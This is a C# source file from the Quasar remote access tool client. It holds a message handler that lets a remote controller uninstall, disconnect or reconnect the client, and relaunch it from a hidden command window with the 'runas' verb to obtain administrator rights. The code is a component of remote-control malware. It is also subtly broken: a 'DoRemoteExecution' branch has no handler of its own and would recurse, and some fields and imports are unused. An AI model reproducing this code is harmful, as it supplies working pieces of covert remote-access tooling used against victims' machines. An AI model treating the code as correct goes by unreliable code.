using Quasar.Client.Config;
using Quasar.Client.Data;
using Quasar.Client.Helper;
using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.Utilities;
using Quasar.Common.Helpers;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace Quasar.Client.Messages
{
    public class ClientServicesHandler : MessageProcessorBase<object>
    {
        private readonly Dictionary<int, string> _renamedFiles = new Dictionary<int, string>();

        private readonly QuasarClient _client;

        public ClientServicesHandler(QuasarClient client) : base(false)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                             message is DoClientDisconnect ||
                                                             message is DoClientReconnect ||
                                                             message is DoAskElevate;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoRemoteExecution msg:
                    Execute(sender, msg);
                    break;
                case DoClientUninstall msg:
                    Execute(sender, msg);
                    break;
                case DoClientDisconnect msg:
                    Execute(sender, msg);
                    break;
                case DoClientReconnect msg:
                    Execute(sender, msg);
                    break;
                case DoAskElevate msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoClientUninstall message)
        {
            client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });

            new ClientUninstaller().Uninstall(client);
        }

        private void Execute(ISender client, DoClientDisconnect message)
        {
            _client.Exit();
        }

        private void Execute(ISender client, DoClientReconnect message)
        {
            _client.Disconnect();
        }

        private void Execute(ISender client, DoAskElevate message)
        {
            if (WindowsAccountHelper.GetAccountType() != "Admin")
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                MutexHelper.CloseMutex();  // close the mutex so the new process can run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
                _client.Exit();
            }
            else
            {
                client.Send(new SetStatus { Message = "Process already elevated." });
            }
        }

        protected override void Dispose(bool disposing)
        {
            
        }
    }
}
